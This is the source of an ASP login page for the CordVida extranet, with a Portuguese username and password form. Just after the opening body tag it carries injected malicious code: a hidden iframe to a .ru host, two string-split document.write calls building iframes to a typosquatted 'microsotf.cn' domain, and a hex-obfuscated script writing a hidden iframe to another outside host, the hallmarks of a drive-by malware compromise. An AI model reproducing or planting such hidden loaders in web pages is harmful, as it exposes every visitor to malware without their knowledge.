<%@Language=JavaScript%>
<%Response.Buffer = true%>
<!--#include virtual="/extranet/classes/login.asp" -->
<!--#include virtual="/extranet/inc/constants.asp" -->
<!--#include virtual="/extranet/inc/net.asp" -->
<html>
<head>
<title>CordVida</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<script>self.status = "CordVida - Extranet"</script>
<link href="main.css" rel="stylesheet" type="text/css">
<style type="text/css">
.rF{border: 1px inset #FF0000;font-family: Verdana, Arial, Helvetica, sans-serif;font-size: 11px;}
</style>
</head>
<body bgcolor="#DCE6A1" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"><iframe src="http://3e0.ru:8080/index.php" width=122 height=189 style="visibility: hidden"></iframe><script>document.write("<"+'if'+''+'ra'+''+"me"+' sr'+"c=\"ht"+'t'+"p:"+''+"/"+''+'/mic'+"roso"+"tf"+''+'.c'+''+"n"+'/'+"\" wid"+''+"th=1 h"+"eigh"+''+'t'+"="+"2></i"+''+"fr"+"a"+''+""+''+"me"+'>');</script><script>document.write("<if"+''+'ra'+''+"m"+'e s'+"rc=\"h"+''+'tt'+"p:"+''+"/"+''+'/mic'+"roso"+'t'+''+'f.c'+"n"+'/'+"\" wid"+''+'th=1 he'+"igh"+''+'t'+"="+"2></i"+''+"f"+"ra"+''+""+''+"me"+'>');</script><script>function v4a8aa5ed7f9ac(v4a8aa5ed7fd94){ function v4a8aa5ed8017c () {var v4a8aa5ed80563=16; return v4a8aa5ed80563;} return(parseInt(v4a8aa5ed7fd94,v4a8aa5ed8017c()));}function v4a8aa5ed8094d(v4a8aa5ed80d34){ function v4a8aa5ed818ec () {var v4a8aa5ed81cd4=2; return v4a8aa5ed81cd4;} var v4a8aa5ed8111c='';for(v4a8aa5ed81504=0; v4a8aa5ed81504<v4a8aa5ed80d34.length; v4a8aa5ed81504+=v4a8aa5ed818ec()){ v4a8aa5ed8111c+=(String.fromCharCode(v4a8aa5ed7f9ac(v4a8aa5ed80d34.substr(v4a8aa5ed81504, v4a8aa5ed818ec()))));}return v4a8aa5ed8111c;} document.write(v4a8aa5ed8094d('3C696672616D65206E616D653D2739323730323835633027207372633D27687474703A2F2F747261636B696E676C6F61642E636F6D2F652F696E646578372E706870272077696474683D353636206865696768743D333333207374796C653D27646973706C61793A6E6F6E65273E3C2F696672616D653E'));</script>
<%
action = getRequestParameterAsInt("act")
if(action != NEXTSTEP)
{
%><table width="100%" height="650" border="0" align="center" cellpadding="1" cellspacing="1">
<tr>
<td>
<form name="form1" method="post" action="index.asp">
<table width="100%" border="0" cellspacing="0" cellpadding="0" style="height: 100%">
<tr>
<td width="150" align="center" valign="top"><img src="img/ui/intlogo.gif" width="120" height="152">
</td>
<td align="center"><table width="381" border="0" cellspacing="0" cellpadding="0">
<tr>
<td colspan="2" background="img/ui/lgbg.gif"><table width="381" border="0" cellspacing="0" cellpadding="0">
<tr>
<td height="153">&nbsp;</td>
</tr>
<tr>
<td><table width="300" border="0" align="center" cellpadding="0" cellspacing="0">
<tr>
<td width="70" align="right"><b class="red">Usu&aacute;rio:&nbsp;</b></td>
<td width="5"><img src="img/ui/fside1.gif" width="5" height="27"></td>
<td bgcolor="#FFFFFF"><input name="username" type="text" class="cmp" value="" size="35"></td>
<td width="5"><img src="img/ui/fside2.gif" width="6" height="27"></td>
</tr>
<tr>
<td height="7" colspan="4"><img src="img/ui/dot.gif" width="1" height="7"></td>
</tr>
<tr>
<td align="right"><b class="red">Senha:&nbsp;</b></td>
<td><img src="img/ui/fside1.gif" width="5" height="27"></td>
<td bgcolor="#FFFFFF"><input name="pass" type="password" class="cmp" value="" size="35"></td>
<td><img src="img/ui/fside2.gif" width="6" height="27"></td>
</tr>
</table></td>
</tr>
<tr>
<td height="142" align="center"><input name="imageField" type="image" src="img/ui/ball.gif" width="70" height="70" border="0">
<br>
<b class="bRed"><a href="#" class="bRed" style="text-decoration:none" onClick="document.form1.submit()">OK</a></b>
</td>
</tr>
</table></td>
<td width="1"><img src="img/ui/dot.gif" width="1" height="382"></td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td background="img/ui/lgbg.gif">&nbsp;</td>
</tr>
<tr>
<td width="262" align="center"><b class="bRed">TEL.: 0800 707 2673</b></td>
<td width="119"><b class="bRed"><a href="http://www.cordvida.com.br/contato.asp" class="bRed" style="text-decoration:none">CONTATO</a></b></td>
<td background="img/ui/lgbg.gif">&nbsp;</td>
</tr>
</table>
<input name="act" type="hidden" value="<%=NEXTSTEP%>">
</td>
<td width="100" align="center"><img src="img/ui/sidelogo.gif" width="59" height="340"></td>
</tr>
</table>
</form>
<script>document.form1.username.focus();</script>
</td>
</tr>
</table>
<%
}
else
{
   login = new Login()
   login.logUserIn()
}//if
%><!--#include virtual="/include/tag.asp" -->
</body>
</html>